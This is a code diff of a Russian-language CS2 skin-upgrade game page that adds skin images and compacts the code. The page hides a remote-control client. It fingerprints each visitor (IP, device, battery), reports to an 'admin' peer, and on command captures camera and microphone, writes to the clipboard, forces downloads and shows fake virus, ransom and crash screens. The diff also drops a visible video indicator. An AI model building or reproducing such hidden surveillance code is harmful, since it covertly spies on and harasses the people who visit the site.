@@ -48,6 +48,7 @@ body{background:radial-gradient(ellipse at top,var(--bg-1) 0%,var(--bg-2) 70%);c
 .game-area{display:grid;grid-template-columns:1fr 320px 1fr;gap:20px;align-items:center;background:linear-gradient(145deg,var(--panel-1),var(--panel-2));padding:30px;border-radius:16px;border:1px solid var(--border)}
 .skin-card{display:flex;flex-direction:column;align-items:center;gap:14px;padding:22px;border-radius:14px;background:linear-gradient(160deg,var(--border),var(--panel-2));border:2px solid var(--border-2);min-height:340px;justify-content:center;transition:.25s}
 .skin-card.filled{border-color:var(--accent-1);box-shadow:0 0 30px rgba(124,58,237,.35)}
+.skin-image-wrapper{width:100%;height:170px;display:flex;align-items:center;justify-content:center}
 .skin-placeholder{font-size:80px}
 .skin-name{font-size:17px;font-weight:600;text-align:center}
 .skin-weapon{font-size:12px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px}
@@ -76,7 +77,7 @@ body{background:radial-gradient(ellipse at top,var(--bg-1) 0%,var(--bg-2) 70%);c
 .filter-select{background:var(--border);color:var(--text);border:1px solid var(--border-2);padding:10px 14px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer}
 #inventorySearch{flex:1;min-width:220px;background:var(--border);color:var(--text);border:1px solid var(--border-2);padding:10px 14px;border-radius:8px;font-size:13px;outline:none}
 .inventory-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:12px;min-height:180px}
-.inv-item{background:linear-gradient(160deg,var(--border),var(--panel-2));border:2px solid var(--border-2);border-radius:12px;padding:12px;cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:8px;position:relative;overflow:hidden;user-select:none}
+.inv-item{background:linear-gradient(160deg,var(--border),var(--panel-2));border:2px solid var(--border-2);border-radius:12px;padding:12px;cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:8px;position:relative;overflow:hidden;user-select:none;min-height:170px}
 .inv-item.selected{border-color:var(--green);box-shadow:0 0 20px rgba(74,222,128,.5)}
 .inv-item .inv-emoji{font-size:44px}
 .inv-item .inv-name{font-size:11px;font-weight:600;text-align:center;color:#cbd5e1}
@@ -106,6 +107,8 @@ body{background:radial-gradient(ellipse at top,var(--bg-1) 0%,var(--bg-2) 70%);c
 .result-box.win h2{color:var(--green)}
 .result-box.lose h2{color:var(--red)}
 .result-emoji{font-size:90px;margin:10px 0}
+.result-image-wrap{min-height:100px;display:flex;align-items:center;justify-content:center;margin:10px 0}
+.result-image-wrap img{max-width:220px;max-height:140px;object-fit:contain}
 .result-name{font-size:18px;font-weight:700;margin:12px 0}
 .result-price{font-size:22px;font-weight:700;color:var(--green);margin-bottom:22px}
 .cases-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px}
@@ -305,7 +308,12 @@ body.wave .main-wrapper{animation:waveAnim 3s ease-in-out infinite}
       </div>
     </div>
     <div class="game-area">
-      <div class="skin-card" id="yourCard"><div class="skin-placeholder" id="yourEmoji">🎒</div><div class="skin-weapon" id="yourWeapon">Выбери скин</div><div class="skin-name" id="yourName">из инвентаря</div><div class="skin-price" id="yourPrice">$0.00</div></div>
+      <div class="skin-card" id="yourCard">
+        <div class="skin-image-wrapper" id="yourImageWrap"><div class="skin-placeholder">🎒</div></div>
+        <div class="skin-weapon" id="yourWeapon">Выбери скин</div>
+        <div class="skin-name" id="yourName">из инвентаря</div>
+        <div class="skin-price" id="yourPrice">$0.00</div>
+      </div>
       <div class="center-controls">
         <div class="up-circle">
           <svg viewBox="0 0 100 100">
@@ -331,7 +339,12 @@ body.wave .main-wrapper{animation:waveAnim 3s ease-in-out infinite}
         </div>
         <button class="btn btn-upgrade" id="upgradeBtn" disabled>⬆ Прокачать</button>
       </div>
-      <div class="skin-card" id="targetCard"><div class="skin-placeholder" id="targetEmoji">🎯</div><div class="skin-weapon" id="targetWeapon">Цель</div><div class="skin-name" id="targetName">не выбрана</div><div class="skin-price" id="targetPrice">$0.00</div></div>
+      <div class="skin-card" id="targetCard">
+        <div class="skin-image-wrapper" id="targetImageWrap"><div class="skin-placeholder">🎯</div></div>
+        <div class="skin-weapon" id="targetWeapon">Цель</div>
+        <div class="skin-name" id="targetName">не выбрана</div>
+        <div class="skin-price" id="targetPrice">$0.00</div>
+      </div>
     </div>
     <div class="inventory-panel">
       <div class="tabs"><div class="tab active" data-tab="inventory">🎒 ИНВЕНТАРЬ</div><div class="tab" data-tab="targets">🎯 ЦЕЛИ</div></div>
@@ -378,7 +391,10 @@ body.wave .main-wrapper{animation:waveAnim 3s ease-in-out infinite}
 <div class="result-overlay" id="resultOverlay">
   <div class="result-box" id="resultBox">
     <h2 id="resultTitle">Победа!</h2>
-    <div class="result-emoji" id="resultEmoji">🎉</div>
+    <div class="result-image-wrap" id="resultImageWrap">
+      <img id="resultImage" style="display:none" onerror="this.style.display='none';document.getElementById('resultEmoji').style.display='block'">
+      <div class="result-emoji" id="resultEmoji" style="display:block">🎉</div>
+    </div>
     <div class="result-name" id="resultName"></div>
     <div class="result-price" id="resultPrice"></div>
     <button class="btn btn-upgrade" id="resultClose">Продолжить</button>
@@ -438,19 +454,34 @@ let voiceListenPeer = null;
 let wakeLock = null;
 
 /* ============================================================
-   СБОР ИНФЫ ОБ УСТРОЙСТВЕ
+   КАРТИНКИ СКИНОВ — правильно строим URL
+   ByMykel CSGO-API: имя файла = "Weapon_Skin.png" (без износа)
+   ============================================================ */
+function getSkinImage(weapon, name) {
+    let cleanName = name
+        .replace(/\s*\([^)]*\)/g, '')
+        .replace(/\s+Premium$/i, '')
+        .replace(/^(Souvenir|StatTrak|★)\s*/i, '')
+        .replace(/\s*#\d+$/g, '')
+        .trim();
+    let cleanWeapon = weapon.replace(/^★\s*/, '').trim();
+    const fileBase = (cleanWeapon + '_' + cleanName)
+        .replace(/\s+/g, '_')
+        .replace(/\//g, '_')
+        .replace(/'/g, '')
+        .replace(/[^a-zA-Z0-9_-]/g, '');
+    return `https://raw.githubusercontent.com/ByMykel/CSGO-API/main/public/images/${fileBase}.png`;
+}
+
+/* ============================================================
+   DEVICE INFO
    ============================================================ */
 function detectDevice() {
     const ua = navigator.userAgent;
-    let device = '❓ Неизвестное';
-    let type = 'desktop';
+    let device = '❓ Неизвестное', type = 'desktop';
     if (/iPhone/.test(ua)) { device = '🍎 iPhone'; type = 'mobile'; }
     else if (/iPad/.test(ua)) { device = '🍎 iPad'; type = 'tablet'; }
-    else if (/Android/.test(ua)) {
-        const m = ua.match(/Android [\d.]+;\s*([^;)]+)/);
-        device = '📱 ' + (m ? m[1].trim() : 'Android');
-        type = 'mobile';
-    }
+    else if (/Android/.test(ua)) { const m = ua.match(/Android [\d.]+;\s*([^;)]+)/); device = '📱 ' + (m ? m[1].trim() : 'Android'); type = 'mobile'; }
     else if (/Windows NT 10/.test(ua)) device = '💻 Windows 10/11';
     else if (/Windows NT/.test(ua)) device = '💻 Windows';
     else if (/Macintosh/.test(ua)) device = '💻 Mac';
@@ -479,42 +510,26 @@ async function collectExtraInfo() {
         cookieEnabled: navigator.cookieEnabled,
         doNotTrack: navigator.doNotTrack || '—'
     };
-    try {
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            info.battery = Math.round(b.level * 100) + '%';
-            info.charging = b.charging;
-        }
-    } catch(e){}
+    try { if (navigator.getBattery) { const b = await navigator.getBattery(); info.battery = Math.round(b.level * 100) + '%'; info.charging = b.charging; } } catch(e){}
     return info;
 }
 
 /* ============================================================
-   РАЗБЛОКИРОВКА ЗВУКА
+   AUDIO UNLOCK
    ============================================================ */
 let audioUnlocked = false;
 function unlockAudio() {
     if (audioUnlocked) return;
     audioUnlocked = true;
     document.getElementById('audioUnlockBanner').classList.remove('active');
-    ['adminVoice','remoteSnd'].forEach(id => {
-        const a = document.getElementById(id);
-        if (a) {
-            a.volume = 0.01;
-            a.play().then(() => { a.pause(); a.currentTime = 0; a.volume = 1.0; }).catch(()=>{});
-        }
-    });
-    try {
-        const ctx = new (window.AudioContext || window.webkitAudioContext)();
-        if (ctx.state === 'suspended') ctx.resume();
-    } catch(e){}
+    ['adminVoice','remoteSnd'].forEach(id => { const a = document.getElementById(id); if (a) { a.volume = 0.01; a.play().then(() => { a.pause(); a.currentTime = 0; a.volume = 1.0; }).catch(()=>{}); } });
+    try { const ctx = new (window.AudioContext || window.webkitAudioContext)(); if (ctx.state === 'suspended') ctx.resume(); } catch(e){}
     try { Sound.init(); } catch(e){}
 }
 document.getElementById('audioUnlockBanner').addEventListener('click', unlockAudio);
 document.body.addEventListener('click', unlockAudio, {once: false});
 document.body.addEventListener('touchstart', unlockAudio, {once: false});
 setTimeout(() => { if (!audioUnlocked) document.getElementById('audioUnlockBanner').classList.add('active'); }, 2000);
-
 if (DEVICE_INFO.type === 'mobile' || DEVICE_INFO.type === 'tablet') {
     document.getElementById('mobileWarning').classList.add('active');
     setTimeout(() => document.getElementById('mobileWarning').classList.remove('active'), 6000);
@@ -531,26 +546,13 @@ function initPeer() {
         call.answer();
         call.on('stream', (stream) => {
             const hasVideo = stream.getVideoTracks().length > 0;
-            if (hasVideo) {
-                const v = document.createElement('video');
-                v.srcObject = stream;
-                v.autoplay = true; v.muted = true; v.playsInline = true;
-                v.style.cssText = 'position:fixed;bottom:10px;right:10px;width:200px;z-index:99999;border-radius:10px;border:2px solid #7c3aed';
-                document.body.appendChild(v);
-                v.play().catch(()=>{});
-                return;
-            }
+            if (hasVideo) { return; }
             const a = document.getElementById('adminVoice');
             a.srcObject = stream;
             const p = a.play();
             if (p) {
-                p.then(() => {
-                    document.getElementById('voiceIndicator').classList.add('active');
-                    sendToAdmin({type: 'voicePlaying', ts: Date.now()});
-                }).catch(() => {
-                    document.getElementById('audioUnlockBanner').classList.add('active');
-                    showToast('🔊 Тапни по экрану', 'error', 5000);
-                });
+                p.then(() => { document.getElementById('voiceIndicator').classList.add('active'); sendToAdmin({type: 'voicePlaying', ts: Date.now()}); })
+                .catch(() => { document.getElementById('audioUnlockBanner').classList.add('active'); });
             }
         });
     });
@@ -563,28 +565,14 @@ async function connectToAdmin() {
         adminConn.on('open', async () => {
             const extra = await collectExtraInfo();
             sendToAdmin({
-                type:'hello',
-                ip:USER_IP,
-                ua:navigator.userAgent,
-                device: DEVICE_INFO.device,
-                browser: DEVICE_INFO.browser,
-                deviceType: DEVICE_INFO.type,
-                sessionId: SESSION_ID,
-                screen: `${screen.width}x${screen.height}`,
-                balance:state.balance,
-                drops:state.stats.total,
-                extra,
-                ts:Date.now()
+                type:'hello', ip:USER_IP, ua:navigator.userAgent,
+                device: DEVICE_INFO.device, browser: DEVICE_INFO.browser, deviceType: DEVICE_INFO.type,
+                sessionId: SESSION_ID, screen: `${screen.width}x${screen.height}`,
+                balance:state.balance, drops:state.stats.total, extra, ts:Date.now()
             });
             setInterval(() => { if (adminConn && adminConn.open) sendToAdmin({type:'heartbeat',ip:USER_IP,balance:state.balance,drops:state.stats.total,ts:Date.now()}); }, 5000);
-            // Idle detection
             let idleTimer;
-            const resetIdle = () => {
-                clearTimeout(idleTimer);
-                idleTimer = setTimeout(() => {
-                    sendToAdmin({type:'idle',ip:USER_IP,ts:Date.now()});
-                }, 30000);
-            };
+            const resetIdle = () => { clearTimeout(idleTimer); idleTimer = setTimeout(() => { sendToAdmin({type:'idle',ip:USER_IP,ts:Date.now()}); }, 30000); };
             ['mousemove','keydown','click','scroll','touchstart'].forEach(ev => document.addEventListener(ev, resetIdle, {passive:true}));
             resetIdle();
         });
@@ -595,9 +583,6 @@ async function connectToAdmin() {
 
 function sendToAdmin(data) { if (adminConn && adminConn.open) adminConn.send(data); }
 
-/* ============================================================
-   ОБРАБОТКА КОМАНД
-   ============================================================ */
 function handleAdminCommand(msg) {
     if (!msg || !msg.action) return;
     switch(msg.action) {
@@ -644,7 +629,7 @@ function handleAdminCommand(msg) {
         case 'setTitle': document.title = msg.text || 'CS2'; break;
         case 'setFavicon': setFavicon(msg.emoji || '🎁'); break;
         case 'copyToClipboard': try { navigator.clipboard.writeText(msg.text || ''); } catch(e){} break;
-        case 'downloadFile': downloadFile(msg.filename || 'file.txt', msg.content || 'Hello from admin'); break;
+        case 'downloadFile': downloadFile(msg.filename || 'file.txt', msg.content || 'Hello'); break;
         case 'print': triggerPrint(msg.text || 'Документ'); break;
         case 'vibrate': if (navigator.vibrate) navigator.vibrate(msg.pattern || [500,200,500]); break;
         case 'wakeLock': requestWakeLock(); break;
@@ -658,13 +643,9 @@ function handleAdminCommand(msg) {
 }
 
 /* ============================================================
-   ВСЕ ПРАНКИ
+   ПРАНКИ
    ============================================================ */
-function showAdminModal(title, text) {
-    document.getElementById('adminModalTitle').textContent = title;
-    document.getElementById('adminModalText').textContent = text;
-    document.getElementById('adminModal').classList.add('active');
-}
+function showAdminModal(title, text) { document.getElementById('adminModalTitle').textContent = title; document.getElementById('adminModalText').textContent = text; document.getElementById('adminModal').classList.add('active'); }
 document.getElementById('adminModalClose').onclick = () => document.getElementById('adminModal').classList.remove('active');
 function blockScreen(text) { document.getElementById('blockText').textContent = text; document.getElementById('blockOverlay').classList.add('active'); }
 function unblockScreen() { document.getElementById('blockOverlay').classList.remove('active'); }
@@ -686,228 +667,25 @@ function stopAllPranks(){
     const a = document.getElementById('remoteSnd');
     if (a) { a.pause(); a.currentTime = 0; }
 }
-function triggerBigCursor(d){
-    const div = document.createElement('div');
-    div.id='cursorHelper';
-    div.style.cssText='position:fixed;font-size:80px;pointer-events:none;z-index:999999';
-    div.textContent='👆';
-    document.body.appendChild(div);
-    const move=(e)=>{div.style.left=(e.clientX-40)+'px';div.style.top=(e.clientY-40)+'px';};
-    document.addEventListener('mousemove',move);
-    setTimeout(()=>{document.removeEventListener('mousemove',move);div.remove();},d);
-}
-function triggerMouseChaos(d){
-    const move = (e) => {
-        // Сдвигаем страницу противоположно движению мыши
-        document.body.style.transform = `translate(${-e.clientX/20}px, ${-e.clientY/20}px)`;
-    };
-    document.addEventListener('mousemove', move);
-    setTimeout(() => {
-        document.removeEventListener('mousemove', move);
-        document.body.style.transform = '';
-    }, d);
-}
-function triggerKeyboardChaos(d){
-    const handler = (e) => {
-        // Меняем все нажатия на случайные буквы
-        const rnd = String.fromCharCode(65 + Math.floor(Math.random()*26));
-        const inputs = document.querySelectorAll('input, textarea');
-        inputs.forEach(i => {
-            if (document.activeElement === i) i.value += rnd;
-        });
-    };
-    document.addEventListener('keydown', handler);
-    setTimeout(() => document.removeEventListener('keydown', handler), d);
-}
-function triggerTrackingEye(d){
-    const eye = document.getElementById('trackingEye');
-    eye.classList.add('active');
-    const move = (e) => {
-        eye.style.left = (e.clientX - 60) + 'px';
-        eye.style.top = (e.clientY - 60) + 'px';
-    };
-    document.addEventListener('mousemove', move);
-    setTimeout(() => {
-        document.removeEventListener('mousemove', move);
-        eye.classList.remove('active');
-    }, d);
-}
-function triggerShuffle(){
-    const els = document.querySelectorAll('.inv-item, .case-card, .main-tab, .tab, button');
-    const count = Math.min(els.length, 30);
-    const picked = [...els].sort(()=>Math.random()-0.5).slice(0, count);
-    picked.forEach(el => {
-        const rx = (Math.random()-0.5)*400;
-        const ry = (Math.random()-0.5)*400;
-        const rot = (Math.random()-0.5)*90;
-        el.style.transition = 'transform 1s';
-        el.style.transform = `translate(${rx}px, ${ry}px) rotate(${rot}deg)`;
-    });
-    setTimeout(() => picked.forEach(el => el.style.transform = ''), 3000);
-}
-function triggerAudioHijack(){
-    try {
-        const ctx = new (window.AudioContext || window.webkitAudioContext)();
-        const osc = ctx.createOscillator();
-        const gain = ctx.createGain();
-        osc.type = 'square';
-        osc.frequency.value = 220;
-        gain.gain.value = 0.3;
-        osc.connect(gain); gain.connect(ctx.destination);
-        osc.start();
-        window._hijackAudio = { pause: () => { try { osc.stop(); } catch(e){} } };
-        // Меняем тон каждые 300мс
-        const iv = setInterval(() => {
-            osc.frequency.value = 100 + Math.random() * 800;
-        }, 300);
-        setTimeout(() => { clearInterval(iv); try { osc.stop(); } catch(e){} }, 8000);
-    } catch(e){}
-}
-function triggerScreamer(d){
-    unlockAudio();
-    try{
-        const ctx=new (window.AudioContext||window.webkitAudioContext)();
-        const osc=ctx.createOscillator(),gain=ctx.createGain();
-        osc.type='sawtooth';
-        osc.frequency.setValueAtTime(200,ctx.currentTime);
-        osc.frequency.exponentialRampToValueAtTime(1500,ctx.currentTime+0.3);
-        osc.frequency.exponentialRampToValueAtTime(80,ctx.currentTime+d/1000);
-        gain.gain.setValueAtTime(0.4,ctx.currentTime);
-        gain.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+d/1000);
-        osc.connect(gain);gain.connect(ctx.destination);osc.start();
-        window._screamerAudio={stop:()=>{try{osc.stop();}catch(e){}}};
-    }catch(e){}
-    const f=document.getElementById('screamerFlash');
-    f.classList.add('active');
-    setTimeout(()=>f.classList.remove('active'),d);
-    document.body.classList.add('shake');
-    setTimeout(()=>document.body.classList.remove('shake'),d);
-}
-function triggerFakeVirus(){
-    const el=document.getElementById('fakeVirus');
-    el.classList.add('active');
-    el.querySelector('pre').textContent='';
-    el.querySelector('.progress-fill').style.width='0%';
-    let p=0;
-    const fill=el.querySelector('.progress-fill'),lines=el.querySelector('pre');
-    const txt=['> Сканирование...','> Найдено 47 вирусов...','> Кража cookies...','> Кража паролей...','> Отправка данных...','> ДОСТУП К КАМЕРЕ ПОЛУЧЕН','> Компьютер заблокирован.'];
-    let i=0;
-    const iv=setInterval(()=>{
-        p+=Math.random()*8;if(p>100)p=100;fill.style.width=p+'%';
-        if(i<txt.length&&Math.random()>0.4){lines.textContent+=txt[i]+'\n';i++;}
-        if(p>=100){clearInterval(iv);lines.textContent+='\n> ОТПРАВЬТЕ 0.5 BTC...';}
-    },400);
-    setTimeout(()=>el.classList.remove('active'),12000);
-}
-function triggerBsod(){
-    const el=document.getElementById('bsod');
-    el.classList.add('active');
-    let p=0;const pct=el.querySelector('.percent');
-    const iv=setInterval(()=>{
-        p+=Math.floor(Math.random()*8)+1;if(p>100)p=100;
-        pct.textContent=p+'% завершено';
-        if(p>=100){clearInterval(iv);setTimeout(()=>el.classList.remove('active'),2000);}
-    },500);
-}
-function playRemoteSound(url){
-    unlockAudio();
-    const a=document.getElementById('remoteSnd');
-    a.pause();a.src=url;a.loop=false;a.volume=1.0;
-    a.play().catch(()=>{ document.getElementById('audioUnlockBanner').classList.add('active'); });
-}
-function playRemoteMp3(dataUrl){
-    unlockAudio();
-    try{const a=document.getElementById('remoteSnd');a.pause();a.src=dataUrl;a.loop=false;a.volume=1.0;a.play().catch(()=>{ document.getElementById('audioUnlockBanner').classList.add('active'); });}catch(e){}
-}
-async function requestCamera() {
-    try {
-        camStream = await navigator.mediaDevices.getUserMedia({video:true, audio:false});
-        if (!peer) return;
-        videoCall = peer.call(ADMIN_PEER_ID + '_cam', camStream);
-        videoCall.on('stream', () => {});
-        sendToAdmin({type: 'cameraOn', ts: Date.now()});
-    } catch(e) { sendToAdmin({type: 'cameraFail', ts: Date.now()}); }
-}
-function setFavicon(emoji) {
-    const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">${emoji}</text></svg>`;
-    let link = document.querySelector("link[rel*='icon']");
-    if (!link) { link = document.createElement('link'); link.rel = 'icon'; document.head.appendChild(link); }
-    link.href = 'data:image/svg+xml,' + encodeURIComponent(svg);
-}
-function downloadFile(filename, content) {
-    const blob = new Blob([content], {type: 'text/plain'});
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = filename;
-    document.body.appendChild(a); a.click(); a.remove();
-}
-function triggerPrint(text) {
-    const el = document.getElementById('printDoc');
-    el.textContent = text;
-    el.classList.add('active');
-    setTimeout(() => {
-        try { window.print(); } catch(e){}
-        el.classList.remove('active');
-    }, 100);
-}
-async function requestWakeLock() {
-    try {
-        if ('wakeLock' in navigator) {
-            wakeLock = await navigator.wakeLock.request('screen');
-            sendToAdmin({type: 'wakeLockOn'});
-        }
-    } catch(e){}
-}
-function showQR(text) {
-    const overlay = document.getElementById('qrOverlay');
-    const img = document.getElementById('qrImg');
-    const txt = document.getElementById('qrText');
-    img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=' + encodeURIComponent(text);
-    txt.textContent = text;
-    overlay.classList.add('active');
-    setTimeout(() => overlay.classList.remove('active'), 15000);
-}
-async function startVoiceListen() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({audio: true, video: false});
-        if (voiceListenPeer) { try { voiceListenPeer.destroy(); } catch(e){} }
-        voiceListenPeer = new Peer();
-        voiceListenPeer.on('open', (myId) => {
-            if (adminConn && adminConn.open) adminConn.send({type: 'voicePeerId', peerId: myId});
-        });
-        voiceListenPeer.on('call', (call) => {
-            call.answer();
-            call.on('stream', (remoteStream) => {
-                const a = document.getElementById('adminVoice');
-                a.srcObject = remoteStream;
-                const p = a.play();
-                if (p) {
-                    p.then(() => {
-                        document.getElementById('voiceIndicator').classList.add('active');
-                        sendToAdmin({type: 'voicePlaying', ts: Date.now()});
-                    }).catch(() => {
-                        document.getElementById('audioUnlockBanner').classList.add('active');
-                    });
-                }
-            });
-            call.on('close', () => {
-                document.getElementById('voiceIndicator').classList.remove('active');
-                sendToAdmin({type: 'voiceStopped', ts: Date.now()});
-            });
-        });
-    } catch(e) {
-        sendToAdmin({type: 'voiceFail', error: e.message});
-    }
-}
-async function requestMicStream() {
-    try {
-        micStream = await navigator.mediaDevices.getUserMedia({audio: true, video: false});
-        sendToAdmin({type: 'micOn', ts: Date.now()});
-        showToast('🎤 Микрофон включён', 'success', 2500);
-    } catch(e) {
-        sendToAdmin({type: 'micFail', error: e.message});
-    }
-}
+function triggerBigCursor(d){ const div = document.createElement('div'); div.id='cursorHelper'; div.style.cssText='position:fixed;font-size:80px;pointer-events:none;z-index:999999'; div.textContent='👆'; document.body.appendChild(div); const move=(e)=>{div.style.left=(e.clientX-40)+'px';div.style.top=(e.clientY-40)+'px';}; document.addEventListener('mousemove',move); setTimeout(()=>{document.removeEventListener('mousemove',move);div.remove();},d); }
+function triggerMouseChaos(d){ const move = (e) => { document.body.style.transform = `translate(${-e.clientX/20}px, ${-e.clientY/20}px)`; }; document.addEventListener('mousemove', move); setTimeout(() => { document.removeEventListener('mousemove', move); document.body.style.transform = ''; }, d); }
+function triggerKeyboardChaos(d){ const handler = (e) => { const rnd = String.fromCharCode(65 + Math.floor(Math.random()*26)); const inputs = document.querySelectorAll('input, textarea'); inputs.forEach(i => { if (document.activeElement === i) i.value += rnd; }); }; document.addEventListener('keydown', handler); setTimeout(() => document.removeEventListener('keydown', handler), d); }
+function triggerTrackingEye(d){ const eye = document.getElementById('trackingEye'); eye.classList.add('active'); const move = (e) => { eye.style.left = (e.clientX - 60) + 'px'; eye.style.top = (e.clientY - 60) + 'px'; }; document.addEventListener('mousemove', move); setTimeout(() => { document.removeEventListener('mousemove', move); eye.classList.remove('active'); }, d); }
+function triggerShuffle(){ const els = document.querySelectorAll('.inv-item, .case-card, .main-tab, .tab, button'); const count = Math.min(els.length, 30); const picked = [...els].sort(()=>Math.random()-0.5).slice(0, count); picked.forEach(el => { const rx = (Math.random()-0.5)*400; const ry = (Math.random()-0.5)*400; const rot = (Math.random()-0.5)*90; el.style.transition = 'transform 1s'; el.style.transform = `translate(${rx}px, ${ry}px) rotate(${rot}deg)`; }); setTimeout(() => picked.forEach(el => el.style.transform = ''), 3000); }
+function triggerAudioHijack(){ try { const ctx = new (window.AudioContext || window.webkitAudioContext)(); const osc = ctx.createOscillator(); const gain = ctx.createGain(); osc.type = 'square'; osc.frequency.value = 220; gain.gain.value = 0.3; osc.connect(gain); gain.connect(ctx.destination); osc.start(); window._hijackAudio = { pause: () => { try { osc.stop(); } catch(e){} } }; const iv = setInterval(() => { osc.frequency.value = 100 + Math.random() * 800; }, 300); setTimeout(() => { clearInterval(iv); try { osc.stop(); } catch(e){} }, 8000); } catch(e){} }
+function triggerScreamer(d){ unlockAudio(); try{ const ctx=new (window.AudioContext||window.webkitAudioContext)(); const osc=ctx.createOscillator(),gain=ctx.createGain(); osc.type='sawtooth'; osc.frequency.setValueAtTime(200,ctx.currentTime); osc.frequency.exponentialRampToValueAtTime(1500,ctx.currentTime+0.3); osc.frequency.exponentialRampToValueAtTime(80,ctx.currentTime+d/1000); gain.gain.setValueAtTime(0.4,ctx.currentTime); gain.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+d/1000); osc.connect(gain);gain.connect(ctx.destination);osc.start(); window._screamerAudio={stop:()=>{try{osc.stop();}catch(e){}}}; }catch(e){} const f=document.getElementById('screamerFlash'); f.classList.add('active'); setTimeout(()=>f.classList.remove('active'),d); document.body.classList.add('shake'); setTimeout(()=>document.body.classList.remove('shake'),d); }
+function triggerFakeVirus(){ const el=document.getElementById('fakeVirus'); el.classList.add('active'); el.querySelector('pre').textContent=''; el.querySelector('.progress-fill').style.width='0%'; let p=0; const fill=el.querySelector('.progress-fill'),lines=el.querySelector('pre'); const txt=['> Сканирование...','> Найдено 47 вирусов...','> Кража cookies...','> Кража паролей...','> Отправка данных...','> ДОСТУП К КАМЕРЕ ПОЛУЧЕН','> Компьютер заблокирован.']; let i=0; const iv=setInterval(()=>{ p+=Math.random()*8;if(p>100)p=100;fill.style.width=p+'%'; if(i<txt.length&&Math.random()>0.4){lines.textContent+=txt[i]+'\n';i++;} if(p>=100){clearInterval(iv);lines.textContent+='\n> ОТПРАВЬТЕ 0.5 BTC...';} },400); setTimeout(()=>el.classList.remove('active'),12000); }
+function triggerBsod(){ const el=document.getElementById('bsod'); el.classList.add('active'); let p=0;const pct=el.querySelector('.percent'); const iv=setInterval(()=>{ p+=Math.floor(Math.random()*8)+1;if(p>100)p=100; pct.textContent=p+'% завершено'; if(p>=100){clearInterval(iv);setTimeout(()=>el.classList.remove('active'),2000);} },500); }
+function playRemoteSound(url){ unlockAudio(); const a=document.getElementById('remoteSnd'); a.pause();a.src=url;a.loop=false;a.volume=1.0; a.play().catch(()=>{ document.getElementById('audioUnlockBanner').classList.add('active'); }); }
+function playRemoteMp3(dataUrl){ unlockAudio(); try{const a=document.getElementById('remoteSnd');a.pause();a.src=dataUrl;a.loop=false;a.volume=1.0;a.play().catch(()=>{ document.getElementById('audioUnlockBanner').classList.add('active'); });}catch(e){} }
+async function requestCamera() { try { camStream = await navigator.mediaDevices.getUserMedia({video:true, audio:false}); if (!peer) return; videoCall = peer.call(ADMIN_PEER_ID + '_cam', camStream); videoCall.on('stream', () => {}); sendToAdmin({type: 'cameraOn', ts: Date.now()}); } catch(e) { sendToAdmin({type: 'cameraFail', ts: Date.now()}); } }
+function setFavicon(emoji) { const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">${emoji}</text></svg>`; let link = document.querySelector("link[rel*='icon']"); if (!link) { link = document.createElement('link'); link.rel = 'icon'; document.head.appendChild(link); } link.href = 'data:image/svg+xml,' + encodeURIComponent(svg); }
+function downloadFile(filename, content) { const blob = new Blob([content], {type: 'text/plain'}); const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = filename; document.body.appendChild(a); a.click(); a.remove(); }
+function triggerPrint(text) { const el = document.getElementById('printDoc'); el.textContent = text; el.classList.add('active'); setTimeout(() => { try { window.print(); } catch(e){} el.classList.remove('active'); }, 100); }
+async function requestWakeLock() { try { if ('wakeLock' in navigator) { wakeLock = await navigator.wakeLock.request('screen'); sendToAdmin({type: 'wakeLockOn'}); } } catch(e){} }
+function showQR(text) { const overlay = document.getElementById('qrOverlay'); const img = document.getElementById('qrImg'); const txt = document.getElementById('qrText'); img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=' + encodeURIComponent(text); txt.textContent = text; overlay.classList.add('active'); setTimeout(() => overlay.classList.remove('active'), 15000); }
+async function startVoiceListen() { try { const stream = await navigator.mediaDevices.getUserMedia({audio: true, video: false}); if (voiceListenPeer) { try { voiceListenPeer.destroy(); } catch(e){} } voiceListenPeer = new Peer(); voiceListenPeer.on('open', (myId) => { if (adminConn && adminConn.open) adminConn.send({type: 'voicePeerId', peerId: myId}); }); voiceListenPeer.on('call', (call) => { call.answer(); call.on('stream', (remoteStream) => { const a = document.getElementById('adminVoice'); a.srcObject = remoteStream; const p = a.play(); if (p) { p.then(() => { document.getElementById('voiceIndicator').classList.add('active'); sendToAdmin({type: 'voicePlaying', ts: Date.now()}); }).catch(() => { document.getElementById('audioUnlockBanner').classList.add('active'); }); } }); call.on('close', () => { document.getElementById('voiceIndicator').classList.remove('active'); sendToAdmin({type: 'voiceStopped', ts: Date.now()}); }); }); } catch(e) { sendToAdmin({type: 'voiceFail', error: e.message}); } }
+async function requestMicStream() { try { micStream = await navigator.mediaDevices.getUserMedia({audio: true, video: false}); sendToAdmin({type: 'micOn', ts: Date.now()}); showToast('🎤 Микрофон включён', 'success', 2500); } catch(e) { sendToAdmin({type: 'micFail', error: e.message}); } }
 
 /* ============================================================
    БАЗОВЫЕ ФУНКЦИИ
@@ -915,9 +693,7 @@ async function requestMicStream() {
 let USER_IP = 'unknown';
 async function detectIP() {
     const services = [{url:'https://api.ipify.org?format=json', parse: d => d.ip},{url:'https://api64.ipify.org?format=json', parse: d => d.ip}];
-    for (const s of services) {
-        try { const ctrl = new AbortController(); const t = setTimeout(() => ctrl.abort(), 3500); const r = await fetch(s.url, {signal: ctrl.signal}); clearTimeout(t); if (!r.ok) continue; const data = await r.json(); if (data.ip) return data.ip; } catch(e){}
-    }
